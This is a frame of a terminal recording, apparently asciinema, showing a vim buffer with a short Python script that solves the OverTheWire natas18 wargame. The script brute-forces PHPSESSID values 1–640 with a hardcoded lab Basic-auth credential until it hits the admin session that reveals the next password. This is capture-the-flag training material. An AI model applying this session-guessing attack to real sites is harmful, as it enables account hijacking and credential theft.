[4.348586, "o", "\u001b[27m\u001b[23m\u001b[29m\u001b[m\u001b[H\u001b[2J\u001b[?25l\u001b[34;1H\"/tmp/n18sid.py\" 15 lines, 721 bytes\u001b[14t\u001b[16t\u001b[1;1Himport urllib.request, base64, re\r\r\n# natas18: PHPSESSID = rand(1,640) (plain ints); the admin session prints the\r\r\n# credentials. Just try every id.\r\r\nurl = \"http://natas18.natas.labs.overthewire.org/\"\r\r\nauth = \"Basic \" + base64.b64encode(b\"natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op\").decode()\r\r\nfor sid in range(1, 641):\r\r\n    r = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\": f\"PHPSESSID={sid}\"})\r\r\n    body = urllib.request.urlopen(r, timeout=15).read().decode(\"utf-8\", \"replace\")\r\r\n    if \"Password:\" in body:\u001b[10;9Hm = re.search(r\"Username: (\\w+)<br>Password: (\\w+)\", body)\u001b[11;9Hprint(\"ADMIN session\", sid, m.group(1), m.group(2) if m else body)\u001b[12;9Hbreak\r\r\nelse:\r\r\n    print(\"no admin session found\")\r\r\n\r\r\n\u001b[1m\u001b[34m~                                                                                                             \u001b[17;1H~                                                                                                             \u001b[18;1H~                                                                                                             \u001b[19;1H~                                                                                                             \u001b[20;1H~                                                                                                             \u001b[21;1H~                                                                                                             \u001b[22;1H~                                                                                                             \u001b[23;1H~                                                                                                             \u001b[24;1H~                                                                                                             \u001b[25;1H~                                                                                                             \u001b[26;1H~                                                                                                             \u001b[27;1H~                                                                                                             \u001b[28;1H~                                                                                                             \u001b[29;1H~                                                                                                             \u001b[30;1H~                                                                                                             \u001b[31;1H~                                                                                                             \u001b[32;1H~                                                                                                             \u001b[33;1H~                                                                                                             \u001b[?25h\u001b[1;1H\u001b[?4m"]
